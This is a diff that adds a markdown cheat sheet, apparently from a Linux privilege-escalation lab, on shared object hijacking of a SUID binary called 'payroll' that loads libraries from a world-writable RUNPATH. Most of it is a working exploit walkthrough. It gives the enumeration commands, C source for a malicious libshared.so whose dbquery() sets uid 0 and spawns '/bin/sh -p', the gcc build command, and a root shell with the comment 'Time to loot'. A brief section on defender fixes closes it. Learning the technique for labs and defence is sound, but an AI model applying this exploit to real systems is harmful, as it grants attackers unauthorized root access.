@@ -1,0 +1,93 @@
+🧪 What is Shared Object Hijacking?
+When a SUID binary or program loads a shared library (like libshared.so) from a writeable path, an attacker can swap in a malicious version to hijack the program’s flow — especially if that binary runs as root.
+
+It's like:
+
+“Hey, I need this helper code… oh look, there’s one sitting right here in this folder anyone can write to 😎”
+
+🧠 ITTT Workflow – Shared Object Hijacking
+✅ IF:
+You find a SUID binary (runs as root):
+
+bash
+Copy
+Edit
+ls -la payroll
+# -rwsr-xr-x 1 root root ...
+ldd shows it depends on a custom lib like:
+
+bash
+Copy
+Edit
+ldd payroll
+libshared.so => /development/libshared.so
+AND /development/ is world-writable:
+
+bash
+Copy
+Edit
+ls -ld /development/
+# drwxrwxrwx
+AND readelf confirms RUNPATH or RPATH is set:
+
+bash
+Copy
+Edit
+readelf -d payroll | grep PATH
+# Library runpath: [/development]
+👉 THEN:
+Hijack that .so file by replacing it with a malicious version that runs /bin/sh with root privileges.
+
+🛠️ Step-by-Step TL;DR (Build, Replace, Hijack)
+1. 🧬 Identify the missing function
+Try to execute the binary:
+
+bash
+Copy
+Edit
+./payroll
+# symbol lookup error: undefined symbol: dbquery
+Boom — we now know it’s looking for dbquery().
+
+2. ✍️ Build your malicious libshared.so
+c
+Copy
+Edit
+// src.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void dbquery() {
+  printf("Malicious library loaded\n");
+  setuid(0);
+  system("/bin/sh -p");
+}
+Compile:
+
+bash
+Copy
+Edit
+gcc -fPIC -shared -o /development/libshared.so src.c
+3. ⚠️ Confirm your lib is replacing the original
+bash
+Copy
+Edit
+ldd payroll
+# libshared.so => /development/libshared.so
+4. 🧨 Execute the binary
+bash
+Copy
+Edit
+./payroll
+# Malicious library loaded
+# id
+# uid=0(root)
+🏁 You’re root. Time to loot.
+
+🛡️ How Defenders Fix This
+Never allow world-writable folders in RUNPATH
+
+Use full absolute library paths
+
+Audit for suspicious .so lookups with tools like strace, ldd, and readelf
